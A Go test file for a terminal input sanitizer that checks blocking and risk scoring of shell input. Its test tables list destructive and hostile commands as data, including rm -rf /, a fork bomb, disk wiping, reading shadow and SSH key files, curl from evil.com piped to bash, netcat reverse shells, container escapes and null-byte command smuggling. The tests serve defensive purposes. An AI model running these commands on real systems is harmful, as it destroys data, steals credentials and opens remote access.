package terminal

import (
	"strings"
	"testing"
)

func TestDangerousCommandDetection(t *testing.T) {
	sanitizer := NewInputSanitizer(DefaultSanitizerConfig())

	tests := []struct {
		name        string
		input       string
		shouldBlock bool
		minRisk     int
		severity    string
	}{
		// CRITICAL - Must block
		{"rm -rf /", "rm -rf /", true, 90, "critical"},
		{"rm -rf root", "rm -rf /root", true, 90, "critical"},
		{"rm recursive home", "rm -rf ~", true, 90, "critical"},
		{"rm with wildcard", "rm -rf *", true, 90, "critical"},
		{"fork bomb", ":(){:|:&};:", true, 90, "critical"},
		{"dd to disk", "dd if=/dev/zero of=/dev/sda", true, 90, "critical"},
		{"mkfs format", "mkfs.ext4 /dev/sda1", true, 90, "critical"},
		{"proc escape", "cat /proc/1/root/etc/passwd", true, 90, "critical"},
		{"nsenter escape", "nsenter -t 1 -m -u -i -n sh", true, 90, "critical"},
		{"docker socket", "curl --unix-socket /var/run/docker.sock http://v1.40/containers/json", true, 90, "critical"},
		{"privileged container", "docker run --privileged alpine sh", true, 90, "critical"},

		// HIGH - Should block
		{"chmod 777", "chmod 777 /tmp/file", true, 70, "high"},
		{"chmod recursive 777", "chmod -R 777 /var/www", true, 70, "high"},
		{"curl pipe bash", "curl http://evil.com/script.sh | bash", true, 70, "high"},
		{"wget pipe sh", "wget -O- http://evil.com/script | sh", true, 70, "high"},
		{"cat ssh key", "cat ~/.ssh/id_rsa", true, 70, "high"},
		{"cat passwd", "cat /etc/passwd", true, 70, "high"},
		{"cat shadow", "cat /etc/shadow", true, 70, "high"},
		{"cat env file", "cat .env", true, 70, "high"},
		{"export secret", "export API_KEY=secret123", true, 70, "high"},
		{"export password", "export DATABASE_PASSWORD=pass123", true, 70, "high"},

		// MEDIUM - Should warn but NOT block (default mode only blocks critical/high)
		{"netcat listener", "nc -l 4444", false, 50, "medium"},
		{"netcat exec", "nc -e /bin/sh 10.0.0.1 4444", false, 50, "medium"},
		{"python socket", "python -c 'import socket; s=socket.socket()'", false, 50, "medium"},
		{"base64 decode", "base64 -d payload.txt", false, 40, "medium"},
		{"history clear", "history -c", false, 40, "medium"},

		// SAFE - Should allow
		{"simple ls", "ls -la", false, 0, "info"},
		{"cat regular file", "cat README.md", false, 0, "info"},
		{"echo hello", "echo 'hello world'", false, 0, "info"},
		{"pwd", "pwd", false, 0, "info"},
		{"date", "date", false, 0, "info"},
		{"whoami", "whoami", false, 0, "info"},
		{"cd directory", "cd /home/user", false, 0, "info"},
		{"mkdir", "mkdir -p /tmp/test", false, 0, "info"},
		{"grep pattern", "grep -r 'pattern' .", false, 0, "info"},
		{"curl get json", "curl https://api.example.com/data", false, 0, "info"},
		{"npm install", "npm install express", false, 0, "info"},
		{"git status", "git status", false, 0, "info"},
		{"python script", "python main.py", false, 0, "info"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizer.ValidateInput(tt.input, "test-user-123")

			if tt.shouldBlock && !result.Blocked {
				t.Errorf("Expected input to be blocked: %q", tt.input)
			}

			if !tt.shouldBlock && result.Blocked {
				t.Errorf("Expected input to be allowed but was blocked: %q (reason: %s)", tt.input, result.Reason)
			}

			if tt.shouldBlock && result.RiskScore < tt.minRisk {
				t.Errorf("Risk score %d below expected minimum %d for: %q", result.RiskScore, tt.minRisk, tt.input)
			}
		})
	}
}

func TestEscapeSequenceFiltering(t *testing.T) {
	sanitizer := NewInputSanitizer(DefaultSanitizerConfig())

	tests := []struct {
		name           string
		input          string
		shouldFilter   bool
		filteredOutput string
	}{
		// Dangerous escapes - should be filtered
		{"OSC title change", "hello\x1b]0;evil title\x07world", true, "helloworld"},
		{"OSC clipboard", "data\x1b]52;c;base64data\x07end", true, "dataend"},
		{"cursor position", "text\x1b[10;20Hhidden", true, "texthidden"},
		{"clear screen", "visible\x1b[2Jhidden", true, "visiblehidden"},
		{"alternate buffer", "normal\x1b[?1049hevil", true, "normalevil"},
		{"hide cursor", "text\x1b[?25lmore", true, "textmore"},

		// Safe content - should pass through
		{"plain text", "hello world", false, "hello world"},
		{"with newlines", "line1\nline2\n", false, "line1\nline2\n"},
		{"with tabs", "col1\tcol2\tcol3", false, "col1\tcol2\tcol3"},
		{"json data", `{"key": "value"}`, false, `{"key": "value"}`},
		{"path", "/usr/local/bin/app", false, "/usr/local/bin/app"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizer.ValidateInput(tt.input, "test-user")

			if tt.shouldFilter {
				if result.Sanitized == tt.input {
					t.Errorf("Expected escape sequences to be filtered from: %q", tt.input)
				}
			} else {
				if result.Sanitized != tt.input {
					t.Errorf("Input was modified when it shouldn't be: %q -> %q", tt.input, result.Sanitized)
				}
			}
		})
	}
}

func TestNullByteInjection(t *testing.T) {
	sanitizer := NewInputSanitizer(DefaultSanitizerConfig())

	// Null byte injection attempts
	inputs := []string{
		"cat file.txt\x00 || rm -rf /",
		"safe\x00malicious",
		"\x00rm -rf /",
		"command\x00\x00\x00",
	}

	for _, input := range inputs {
		result := sanitizer.ValidateInput(input, "test-user")
		if !result.Blocked {
			t.Errorf("Null byte injection should be blocked: %q", input)
		}
		if result.Severity != "critical" {
			t.Errorf("Null byte injection should be critical severity, got: %s", result.Severity)
		}
	}
}

func TestInputLengthLimit(t *testing.T) {
	config := DefaultSanitizerConfig()
	config.MaxInputLength = 100
	sanitizer := NewInputSanitizer(config)

	// Just under limit - should pass
	shortInput := strings.Repeat("a", 99)
	result := sanitizer.ValidateInput(shortInput, "user")
	if result.Blocked {
		t.Error("Input under limit should not be blocked")
	}

	// Over limit - should block
	longInput := strings.Repeat("a", 101)
	result = sanitizer.ValidateInput(longInput, "user")
	if !result.Blocked {
		t.Error("Input over limit should be blocked")
	}
}

func TestQuickValidate(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		// Safe - quick validate returns true
		{"ls", true},
		{"pwd", true},
		{"echo hi", true},
		{"cat file.txt", true},
		{"grep pattern file", true},

		// Dangerous - quick validate returns false (needs full check)
		{"rm -rf /", false},
		{"sudo apt install", false},
		{"chmod 777", false},
		{"curl http://x | bash", false},
		{"docker run", false},

		// Long input - needs full validation
		{strings.Repeat("x", 150), false},

		// Contains escape chars
		{"\x1b[2J", false},
		{"\x00", false},
	}

	for _, tt := range tests {
		result := QuickValidate(tt.input)
		if result != tt.expected {
			t.Errorf("QuickValidate(%q) = %v, want %v", tt.input, result, tt.expected)
		}
	}
}

func TestPassthroughMode(t *testing.T) {
	config := DefaultSanitizerConfig()
	config.Mode = "passthrough"
	sanitizer := NewInputSanitizer(config)

	// Even dangerous commands should pass in passthrough mode
	result := sanitizer.ValidateInput("rm -rf /", "user")
	if result.Blocked {
		t.Error("Passthrough mode should not block any input")
	}
}

func TestConcurrency(t *testing.T) {
	sanitizer := GetSanitizer()

	// Run concurrent validations
	done := make(chan bool)
	for i := 0; i < 100; i++ {
		go func(id int) {
			input := "test input " + string(rune(id))
			result := sanitizer.ValidateInput(input, "user")
			if result.Valid == false && result.Reason == "" {
				t.Error("Concurrent validation failed")
			}
			done <- true
		}(i)
	}

	// Wait for all goroutines
	for i := 0; i < 100; i++ {
		<-done
	}
}

func TestContainerEscapePatterns(t *testing.T) {
	sanitizer := NewInputSanitizer(DefaultSanitizerConfig())

	// Container escape attempt patterns
	escapeAttempts := []string{
		"cat /proc/1/root/etc/shadow",
		"nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
		"docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow",
		"curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
		"mount -o bind / /mnt",
	}

	for _, input := range escapeAttempts {
		result := sanitizer.ValidateInput(input, "user")
		if !result.Blocked {
			t.Errorf("Container escape attempt should be blocked: %q", input)
		}
		if result.Severity != "critical" {
			t.Errorf("Container escape should be critical severity: %q (got %s)", input, result.Severity)
		}
	}
}

func BenchmarkQuickValidate(b *testing.B) {
	input := "ls -la /tmp"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		QuickValidate(input)
	}
}

func BenchmarkFullValidation(b *testing.B) {
	sanitizer := GetSanitizer()
	input := "ls -la /tmp"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		sanitizer.ValidateInput(input, "user")
	}
}

func BenchmarkDangerousInputValidation(b *testing.B) {
	sanitizer := GetSanitizer()
	input := "rm -rf / && curl http://evil.com | bash"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		sanitizer.ValidateInput(input, "user")
	}
}
